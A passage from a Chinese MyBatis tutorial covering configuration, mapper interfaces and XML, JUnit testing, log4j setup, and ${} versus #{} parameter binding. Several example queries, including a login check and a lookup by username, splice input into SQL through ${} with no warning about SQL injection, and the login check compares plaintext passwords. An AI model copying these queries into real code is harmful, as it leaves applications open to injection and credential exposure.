        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;
&lt;configuration&gt;
    &lt;!-- &#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6807;&#x7B7E;&#x5FC5;&#x987B;&#x6309;&#x56FA;&#x5B9A;&#x7684;&#x987A;&#x5E8F;&#x4E66;&#x5199; --&gt;
    &lt;!-- The content of element type &quot;configuration&quot; must match &quot;(properties?,settings?,typeAliases?,typeHandlers?,objectFactory?,objectWrapperFactory?,reflectorFactory?,plugins?,environments?,databaseIdProvider?,mappers?)&quot;. --&gt;
    &lt;!-- &#x5F15;&#x5165;properties&#x6587;&#x4EF6; --&gt;
    &lt;properties resource=&quot;jdbc.properties&quot; /&gt;
    &lt;!-- &#x8BBE;&#x7F6E;&#x7C7B;&#x578B;&#x522B;&#x540D; =&gt; &#x7C7B;&#x578B;&#x522B;&#x540D;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199; --&gt;
    &lt;typeAliases&gt;
        &lt;!-- typeAlias &#x8BBE;&#x7F6E;&#x67D0;&#x4E2A;&#x7C7B;&#x578B;&#x7684;&#x522B;&#x540D;,&#x4E0D;&#x8BBE;&#x7F6E; alias &#x5219;&#x9ED8;&#x8BA4;&#x4EE5;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#x7684;&#x7C7B;&#x540D;&#x8868;&#x793A; --&gt;
        &lt;!-- &lt;typeAlias type=&quot;com.zszy.mybatis.pojo.User&quot; alias=&quot;User&quot;&gt;&lt;/typeAlias&gt; --&gt;
        &lt;!-- &#x4EE5;&#x5305;&#x4E3A;&#x5355;&#x4F4D;&#x5C06;&#x5305;&#x4E0B;&#x6240;&#x6709;&#x7684;&#x7C7B;&#x578B;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7684;&#x7C7B;&#x578B;&#x522B;&#x540D;,&#x5373;&#x7C7B;&#x540D;&#x4E14;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199; --&gt;
        &lt;package name=&quot;com.zszy.mybatis.pojo&quot;/&gt;
    &lt;/typeAliases&gt;
    &lt;!--&#x8BBE;&#x7F6E;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x73AF;&#x5883;--&gt;
    &lt;!--
    environments =&gt; &#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x73AF;&#x5883;
    &#x5C5E;&#x6027; default =&gt; &#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684;&#x73AF;&#x5883;&#x7684;id
    --&gt;
    &lt;environments default=&quot;development&quot;&gt;
        &lt;!--
        environment =&gt; &#x8BBE;&#x7F6E;&#x5177;&#x4F53;&#x7684;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x73AF;&#x5883;&#x4FE1;&#x606F;
        &#x5C5E;&#x6027;id =&gt; &#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6;;&#x53EF;&#x901A;&#x8FC7;environments&#x6807;&#x7B7E;&#x4E2D;&#x7684;default&#x8BBE;&#x7F6E;&#x67D0;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x7684;id,&#x8868;&#x793A;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684;&#x73AF;&#x5883;
        --&gt;
        &lt;environment id=&quot;development&quot;&gt;
            &lt;!--
            transactionManager =&gt; &#x8BBE;&#x7F6E;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x65B9;&#x5F0F;
            &#x5C5E;&#x6027; type  =&gt; &#x8BBE;&#x7F6E;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x65B9;&#x5F0F; =&gt; type=&quot;JDBC|MANAGED&quot;
	            type=&quot;JDBC&quot; =&gt; &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x73AF;&#x5883;&#x7684;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x90FD;&#x5FC5;&#x987B;&#x624B;&#x52A8;&#x5904;&#x7406;
	            type=&quot;MANAGED&quot; =&gt; &#x8BBE;&#x7F6E;&#x4E8B;&#x52A1;&#x88AB;&#x7BA1;&#x7406;,&#x4F8B;&#x5982;spring&#x4E2D;&#x7684;AOP
            --&gt;
            &lt;transactionManager type=&quot;JDBC&quot;/&gt;
            &lt;!--
            dataSource =&gt; &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x6E90;
            &#x5C5E;&#x6027; type =&gt; &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x6E90;&#x7684;&#x7C7B;&#x578B; =&gt; type=&quot;POOLED|UNPOOLED|JNDI&quot;
	            type=&quot;POOLED&quot; =&gt; &#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;,&#x5373;&#x4F1A;&#x5C06;&#x521B;&#x5EFA;&#x7684;&#x8FDE;&#x63A5;&#x8FDB;&#x884C;&#x7F13;&#x5B58;,&#x4E0B;&#x6B21;&#x4F7F;&#x7528;&#x53EF;&#x4EE5;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x76F4;&#x63A5;&#x83B7;&#x53D6;,&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x521B;&#x5EFA;
	            type=&quot;UNPOOLED&quot; =&gt; &#x4E0D;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;;&#x6BCF;&#x6B21;&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x90FD;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x521B;&#x5EFA;
	            type=&quot;JNDI&quot; =&gt; &#x8C03;&#x7528;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6E90;
            --&gt;
            &lt;dataSource type=&quot;POOLED&quot;&gt;
                &lt;!-- alt + shift + &#x4E0A;&#x4E0B; --&gt;
                &lt;property name=&quot;driver&quot; value=&quot;${jdbc.driver}&quot;/&gt;
                &lt;!-- &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/MyBatis?serverTimezone=UTC&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&quot;/&gt; --&gt;
                &lt;property name=&quot;url&quot; value=&quot;${jdbc.url}&quot;/&gt;
                &lt;property name=&quot;username&quot; value=&quot;${jdbc.username}&quot;/&gt;
                &lt;property name=&quot;password&quot; value=&quot;${jdbc.password}&quot;/&gt;
            &lt;/dataSource&gt;
        &lt;/environment&gt;
    &lt;/environments&gt;
    &lt;!-- &#x5F15;&#x5165;&#x6620;&#x5C04;&#x6587;&#x4EF6; --&gt;
    &lt;mappers&gt;
        &lt;!-- &lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt; --&gt;
        &lt;!-- &#x4EE5;&#x5305;&#x4E3A;&#x5355;&#x4F4D;&#x6620;&#x5C04;&#x914D;&#x7F6E;&#x6587;&#x4EF6; =&gt; &#x6CE8;&#x610F;&#x5728; resources &#x4E2D;&#x521B;&#x5EFA;&#x5305;&#x4E0D;&#x80FD;&#x4EE5;.&#x5206;&#x5272;,&#x800C;&#x662F;&#x5E94;&#x8BE5;&#x7528;/ --&gt;
        &lt;!-- &#x6B64;&#x5305;&#x4E0B;&#x6240;&#x6709;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x5F15;&#x5165;&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D; =&gt; mapper&#x5373;&#x662F;&#x7A7A;&#x5076;&#x6240;&#x5728;&#x7684;&#x5305;&#x8981;&#x4E0E;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x5305;&#x4E00;&#x81F4;;mapper&#x63A5;&#x53E3;&#x8981;&#x4E0E;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x4E00;&#x81F4; --&gt;
        &lt;package name=&quot;com.zszy.mybatis.mapper&quot;/&gt;
    &lt;/mappers&gt;
&lt;/configuration&gt;
</code></pre>
<h3 id="mapper-%E6%8E%A5%E5%8F%A3">mapper &#x63A5;&#x53E3;</h3>
<p>MyBatis &#x4E2D;&#x7684; mapper &#x63A5;&#x53E3;&#x76F8;&#x5F53;&#x4E8E; dao&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E; mapper &#x4EC5;&#x662F;&#x63A5;&#x53E3;&#xFF0C;&#x65E0;&#x9700;&#x63D0;&#x4F9B;&#x5B9E;&#x73B0;&#x7C7B;&#x3002;</p>
<pre><code class="language-java">public interface &lt;functionOperater&gt; {
    /**
     * mybatis &#x9762;&#x5411;&#x63A5;&#x53E3;&#x7F16;&#x7A0B;&#x7684;&#x4E24;&#x4E2A;&#x4E00;&#x81F4;
     * =&gt; &#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x547D;&#x540D;&#x7A7A;&#x95F4; namespace &#x4E0E;&#x63A5;&#x53E3;&#x7684;&#x5168;&#x7C7B;&#x540D;&#x4E00;&#x81F4;;
     * =&gt; &#x6620;&#x5C04;&#x6587;&#x4EF6;&#x4E2D; SQL &#x8BED;&#x53E5; id &#x4E0E; mapper &#x63A5;&#x53E3;&#x4E2D;&#x65B9;&#x6CD5;&#x540D;&#x4E00;&#x81F4;
     */
    /**
     * xxx&#x64CD;&#x4F5C;
     */
    &lt;returnValue&gt; &lt;functionOperater&gt;();
}
</code></pre>
<h3 id="%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6">&#x6620;&#x5C04;&#x6587;&#x4EF6;</h3>
<ul>
<li>ORM Object Relationship Mapping &#x5BF9;&#x8C61;&#x5173;&#x7CFB;&#x6620;&#x5C04;
<ul>
<li>&#x5BF9;&#x8C61;&#x5373;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x5173;&#x7CFB;&#x5373;&#x4E3A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6620;&#x5C04;&#x662F;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;</li>
<li>&#x7C7B;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#xFF0C;&#x5C5E;&#x6027;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5B57;&#x6BB5;&#x548C;&#x5217;&#xFF0C;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8BB0;&#x5F55;&#x548C;&#x884C;</li>
</ul>
</li>
<li>&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x547D;&#x540D;&#x89C4;&#x5219; =&gt; &#x8868;&#x6240;&#x5BF9;&#x5E94;&#x5B9E;&#x4F53;&#x7C7B;&#x7684;&#x7C7B;&#x540D; + Mapper.xml</li>
<li>&#x4E00;&#x4E2A;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x5B9E;&#x4F53;&#x7C7B;&#xFF0C;&#x5BF9;&#x5E94;&#x4E00;&#x5F20;&#x8868;&#x7684;&#x64CD;&#x4F5C;</li>
<li>MyBatis&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7528;&#x4E8E;&#x7F16;&#x5199;SQL&#xFF0C;&#x8BBF;&#x95EE;&#x4EE5;&#x53CA;&#x64CD;&#x4F5C;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;</li>
<li>MyBatis&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x7684;&#x4F4D;&#x7F6E;&#x662F;src/main/resources/mappers&#x76EE;&#x5F55;&#x4E0B;</li>
<li>MyBatis&#x4E2D;&#x53EF;&#x4EE5;&#x9762;&#x5411;&#x63A5;&#x53E3;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#xFF0C;&#x8981;&#x4FDD;&#x8BC1;&#x4E24;&#x4E2A;&#x4E00;&#x81F4;
<ul>
<li>mapper&#x63A5;&#x53E3;&#x7684;&#x5168;&#x7C7B;&#x540D;&#x548C;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x547D;&#x540D;&#x7A7A;&#x95F4; namespace &#x4FDD;&#x6301;&#x4E00;&#x81F4;</li>
<li>mapper&#x63A5;&#x53E3;&#x4E2D;&#x65B9;&#x6CD5;&#x7684;&#x65B9;&#x6CD5;&#x540D;&#x548C;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x4E2D;&#x7F16;&#x5199; SQL &#x7684;&#x6807;&#x7B7E;&#x7684; id &#x5C5E;&#x6027;&#x4FDD;&#x6301;&#x4E00;&#x81F4;</li>
</ul>
</li>
</ul>
<pre><code class="language-xml">&lt;!-- src/main/resources/com.../mappers/XxxMapper.xml --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;
&lt;mapper namespace=&quot;&quot;&gt;
    &lt;!-- returnValue operatorMethod(); --&gt;
    &lt;!-- &lt;sql operater&gt;sql&lt;/sql operater&gt; --&gt;
&lt;/mapper&gt;
</code></pre>
<p>&#x67E5;&#x8BE2;&#x7684;&#x6807;&#x7B7E; select &#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#x5C5E;&#x6027; resultType &#x6216; resultMap&#xFF0C;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x5B9E;&#x4F53;&#x7C7B;&#x548C;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x3002;&#x524D;&#x8005;&#x8868;&#x793A;&#x81EA;&#x52A8;&#x6620;&#x5C04;&#xFF0C;&#x7528;&#x4E8E;&#x5C5E;&#x6027;&#x540D;&#x548C;&#x8868;&#x4E2D;&#x5B57;&#x6BB5;&#x540D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#xFF1B;&#x540E;&#x8005;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x6620;&#x5C04;&#xFF0C;&#x7528;&#x4E8E;&#x4E00;&#x5BF9;&#x591A;&#x6216;&#x591A;&#x5BF9;&#x4E00;&#x6216;&#x5B57;&#x6BB5;&#x540D;&#x548C;&#x5C5E;&#x6027;&#x540D;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x3002;</p>
<p>&#x5F53;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x4E3A;&#x591A;&#x6761;&#x65F6;&#xFF0C;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x5B9E;&#x4F53;&#x7C7B;&#x4F5C;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x96C6;&#x5408;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38; <code>TooManyResultsException</code>&#xFF1B;&#x82E5;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4E00;&#x6761;&#xFF0C;&#x5219;&#x53EF;&#x4F7F;&#x7528;&#x5B9E;&#x4F53;&#x7C7B;&#x6216;&#x96C6;&#x5408;&#x4F5C;&#x4E3A;&#x8FD4;&#x56DE;&#x503C;&#x3002;</p>
<pre><code class="language-java">&lt;!-- int insertUser(); --&gt;
&lt;insert id=&quot;insertUser&quot;&gt; insert into t_user values(null,&apos;admin&apos;,&apos;123456&apos;,23,&apos;&#x7537;&apos;,&apos;12345@qq.com&apos;) &lt;/insert&gt;
&lt;!-- int deleteUser(); --&gt;
&lt;delete id=&quot;deleteUser&quot;&gt; delete from t_user where id = 6 &lt;/delete&gt;
&lt;!-- int updateUser(); --&gt;
&lt;update id=&quot;updateUser&quot;&gt; update t_user set username = &apos;zs&apos; where id = 5 &lt;/update&gt;
&lt;!-- User getUserById(); --&gt;  
&lt;select id=&quot;getUserById&quot; resultType=&quot;com.xxx.mybatis.bean.User&quot;&gt; select * from t_user where id = 2 &lt;/select&gt;
&lt;!-- List&lt;User&gt; getUserList(); --&gt;
&lt;select id=&quot;getUserList&quot; resultType=&quot;com.xxx.mybatis.bean.User&quot;&gt; select * from t_user &lt;/select&gt;
</code></pre>
<h3 id="junit-%E5%8A%9F%E8%83%BD%E6%B5%8B%E8%AF%95">junit &#x529F;&#x80FD;&#x6D4B;&#x8BD5;</h3>
<ul>
<li>SqlSession &#x662F; Java &#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x7684;&#x4F1A;&#x8BDD;&#xFF1B;HttpSession &#x662F; Java &#x7A0B;&#x5E8F;&#x548C;&#x6D4F;&#x89C8;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x4F1A;&#x8BDD;&#x3002;</li>
</ul>
<pre><code class="language-java">public interface SqlSession extends Closeable { ...&#x589E;&#x5220;&#x6539;&#x67E5;&#x4E8B;&#x52A1; }
</code></pre>
<ul>
<li>SqlSessionFactory &#x662F;&#x751F;&#x4EA7; SqlSession &#x7684;&#x5DE5;&#x5382;&#x3002;</li>
</ul>
<pre><code class="language-java">public interface SqlSessionFactory {
    SqlSession openSession(...); // SqlSessionFactory.openSession(true);
    ...
    Configuration getConfiguration();
}
</code></pre>
<ul>
<li>SqlSession &#x9ED8;&#x8BA4;&#x4E0D;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#xFF0C;&#x9700;&#x624B;&#x52A8;&#x63D0;&#x4EA4;&#x3002;</li>
</ul>
<pre><code class="language-java">// &#x5F00;&#x542F;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;
SqlSession sqlSession = sqlSessionFactory.openSession(true);
</code></pre>
<pre><code class="language-java">public class MyBatistest {
    @Test
    public void testMyBatis() throws IOException {
        // &#x52A0;&#x8F7D;&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;
        InputStream is = Resources.getResourceAsStream(&quot;mybatis-config.xml&quot;);
        // &#x83B7;&#x53D6; SqlSessionFactoryBuilder
        SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();
        // &#x83B7;&#x53D6;sqlSessionFactoryBuilder
        SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);
        // &#x83B7;&#x53D6; mybatis &#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4F1A;&#x8BDD;&#x5BF9;&#x8C61; sqlSession
        SqlSession sqlSession = sqlSessionFactory.openSession(true); // autoCommit
        // &#x83B7;&#x53D6; mapper &#x63A5;&#x53E3;&#x5BF9;&#x8C61;
        UserMapper mapper = sqlSession.getMapper(UserMapper.class);
        // &#x6D4B;&#x8BD5;&#x529F;&#x80FD;
        &lt;returnValue&gt; rv = mapper.&lt;operatorMethod&gt;();
        // &#x63D0;&#x4EA4;&#x4E8B;&#x52A1;
        // sqlSession.commit();
        System.out.println(&quot;result =&gt; &quot; +rv);
    }
}
</code></pre>
<h3 id="log4j-%E6%97%A5%E5%BF%97%E5%8A%9F%E8%83%BD">log4j &#x65E5;&#x5FD7;&#x529F;&#x80FD;</h3>
<p>Slf4j &#x7C7B;&#x4F3C;&#x4E8E; Commons Logging&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x65E5;&#x5FD7;&#x63A5;&#x53E3;&#xFF0C;&#x800C; Logback &#x7C7B;&#x4F3C;&#x4E8E; Log4j&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x65E5;&#x5FD7;&#x7684;&#x5B9E;&#x73B0;&#x3002;</p>
<ul>
<li>Maven &#x4F9D;&#x8D56;</li>
</ul>
<pre><code class="language-xml">&lt;!-- log4j &#x65E5;&#x5FD7; --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j&lt;/artifactId&gt;
    &lt;version&gt;1.2.17&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>log4j &#x914D;&#x7F6E;&#x6587;&#x4EF6;</li>
</ul>
<p>log4j &#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x540D;&#x4E3A; log4j.xml&#xFF0C;&#x5B58;&#x653E;&#x7684;&#x4F4D;&#x7F6E;&#x662F; <code>src/main/resources</code> &#x76EE;&#x5F55;&#xFF1B;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#x5305;&#x62EC; FATAL&#x3001;ERROR&#x3001;WARN&#x3001;INFO&#x3001;DEBUG&#x3002;</p>
<pre><code class="language-xml">&lt;!-- log4j.xml --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE log4j:configuration SYSTEM &quot;log4j.dtd&quot;&gt;
&lt;log4j:configuration xmlns:log4j=&quot;http://jakarta.apache.org/log4j/&quot;&gt;
    &lt;appender name=&quot;STDOUT&quot; class=&quot;org.apache.log4j.ConsoleAppender&quot;&gt;
        &lt;param name=&quot;Encoding&quot; value=&quot;UTF-8&quot; /&gt;
        &lt;layout class=&quot;org.apache.log4j.PatternLayout&quot;&gt;
            &lt;param name=&quot;ConversionPattern&quot; value=&quot;%-5p %d{MM-dd HH:mm:ss,SSS} %m (%F:%L) \n&quot; /&gt;
        &lt;/layout&gt;
    &lt;/appender&gt;
    &lt;logger name=&quot;java.sql&quot;&gt;
        &lt;level value=&quot;debug&quot; /&gt;
    &lt;/logger&gt;
    &lt;logger name=&quot;org.apache.ibatis&quot;&gt;
        &lt;level value=&quot;info&quot; /&gt;
    &lt;/logger&gt;
    &lt;root&gt;
        &lt;level value=&quot;debug&quot; /&gt;
        &lt;appender-ref ref=&quot;STDOUT&quot; /&gt;
    &lt;/root&gt;
&lt;/log4j:configuration&gt;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mybatis-%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0%E5%80%BC%E7%9A%84%E6%96%B9%E5%BC%8F">MyBatis &#x83B7;&#x53D6;&#x53C2;&#x6570;&#x503C;&#x7684;&#x65B9;&#x5F0F;</h2>
<p>MyBatis &#x83B7;&#x53D6;&#x53C2;&#x6570;&#x7684;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x4E3A; <code>${}</code> &#x548C; <code>#{}</code>&#x3002;<code>${}</code> &#x672C;&#x8D28;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#xFF0C;<code>#{}</code> &#x672C;&#x8D28;&#x662F;&#x5360;&#x4F4D;&#x7B26;&#x8D4B;&#x503C;&#x3002;</p>
<p>&#x4F7F;&#x7528; <code>${}</code> &#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6216;&#x65E5;&#x671F;&#x7C7B;&#x578B;&#x62FC;&#x63A5;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#xFF1B;&#x4F7F;&#x7528; <code>#{}</code> &#x62FC;&#x63A5;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6216;&#x65E5;&#x671F;&#x7C7B;&#x578B;&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x3002;</p>
<p>&#x5EFA;&#x8BAE;&#x5206;&#x6210;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x5B9E;&#x4F53;&#x7C7B;&#x578B;&#x3001;&#x4E00;&#x79CD;&#x662F; @Param&#x3002;</p>
<h3 id="%E5%8D%95%E5%AD%97%E9%9D%A2%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0">&#x5355;&#x5B57;&#x9762;&#x91CF;&#x7C7B;&#x578B;&#x53C2;&#x6570;</h3>
<p>&#x82E5; mapper &#x63A5;&#x53E3;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x53C2;&#x6570;&#x4E3A;&#x5355;&#x4E2A;&#x7684;&#x5B57;&#x9762;&#x91CF;&#x7C7B;&#x578B;&#xFF0C;&#x53EF;&#x4F7F;&#x7528; <code>${}</code> &#x548C; <code>#{}</code> &#x83B7;&#x53D6;&#x53C2;&#x6570;&#x503C;&#xFF0C;&#x6CE8;&#x610F;&#x524D;&#x8005;&#x9700;&#x624B;&#x52A8;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x3002;</p>
<pre><code class="language-java">public interface ParameterMapper { ...
    // &#x6839;&#x636E;&#x7528;&#x6237;&#x540D;&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x4FE1;&#x606F;
    User getUserByUsername(String username);
}
</code></pre>
<pre><code class="language-xml">&lt;!-- User getUserByUsername(String username); --&gt;
&lt;select id=&quot;getUserByUsername&quot; resultType=&quot;User&quot;&gt;
    &lt;!-- select * from t_user where username = #{username} --&gt;
    select * from t_user where username = &apos;${username}&apos;
&lt;/select&gt;
</code></pre>
<pre><code class="language-xml">&lt;!--User getUserByUsername(String username);--&gt;
&lt;select id=&quot;getUserByUsername&quot; resultType=&quot;User&quot;&gt; select * from t_user where username = &apos;${username}&apos; &lt;/select&gt;
&lt;!--User getUserByUsername(String username);--&gt;
&lt;select id=&quot;getUserByUsername&quot; resultType=&quot;User&quot;&gt; select * from t_user where username = #{username} &lt;/select&gt;
</code></pre>
<h3 id="%E5%A4%9A%E5%AD%97%E9%9D%A2%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0">&#x591A;&#x5B57;&#x9762;&#x91CF;&#x7C7B;&#x578B;&#x53C2;&#x6570;</h3>
<p>&#x82E5; mapper &#x63A5;&#x53E3;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x53C2;&#x6570;&#x4E3A;&#x591A;&#x4E2A;&#x5B57;&#x9762;&#x91CF;&#x7C7B;&#x578B;&#xFF0C;MyBatis &#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x5728;&#x517C;&#x5BB9;&#x5904;&#x7406;&#x540E;&#x653E;&#x5165; map &#x96C6;&#x5408;&#x3002;&#x4EE5; <code>arg[0-n]</code> &#x548C; <code>param[1-n]</code> &#x952E;&#xFF0C;&#x4EE5;&#x53C2;&#x6570;&#x4E3A;&#x503C;&#x3002;</p>
<p>&#x901A;&#x8FC7; <code>${}</code> &#x548C; <code>#{}</code> &#x8BBF;&#x95EE;&#x96C6;&#x5408;&#x7684;&#x952E;&#x5C31;&#x53EF;&#x83B7;&#x53D6;&#x76F8;&#x5E94;&#x7684;&#x503C;&#x3002;&#x6CE8;&#x610F; <code>${}</code> &#x4ECD;&#x9700;&#x624B;&#x52A8;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#xFF1B;&#x4E14; arg &#x662F;&#x4ECE;&#x4E0B;&#x6807; 0 &#x5F00;&#x59CB;&#xFF0C;param &#x662F;&#x4ECE;&#x4E0B;&#x6807; 1 &#x5F00;&#x59CB;&#x3002;</p>
<pre><code class="language-java">public interface ParameterMapper { ...
    // &#x9A8C;&#x8BC1;&#x767B;&#x5F55;
    User checkLogin(String username,String password);
}
</code></pre>
<pre><code class="language-xml">&lt;select id=&quot;checkLogin&quot; resultType=&quot;User&quot;&gt;
    &lt;!-- mybatis&#x5E95;&#x5C42;&#x68C0;&#x6D4B;&#x591A;&#x4E2A;&#x53C2;&#x6570;&#x4F7F;&#x7528; arg &#x6216;&#x8005; param --&gt;
    &lt;!-- select * from t_user where username = #{arg0} and password = #{arg1} --&gt;
    &lt;!-- select * from t_user where username = #{param1} and password = #{param2} --&gt;
    select * from t_user where username = &apos;${param1}&apos; and password = &apos;${arg1}&apos;
&lt;/select&gt;
</code></pre>
<pre><code class="language-xml">&lt;!--User checkLogin(String username,String password);--&gt;
&lt;select id=&quot;checkLogin&quot; resultType=&quot;User&quot;&gt; select * from t_user where username = #{arg0} and password = #{arg1} &lt;/select&gt;
&lt;!--User checkLogin(String username,String password);--&gt;
&lt;select id=&quot;checkLogin&quot; resultType=&quot;User&quot;&gt; select * from t_user where username = &apos;${param1}&apos; and password = &apos;${param2}&apos; &lt;/select&gt;
</code></pre>
<h3 id="map-%E9%9B%86%E5%90%88%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0">map &#x96C6;&#x5408;&#x7C7B;&#x578B;&#x53C2;&#x6570;</h3>
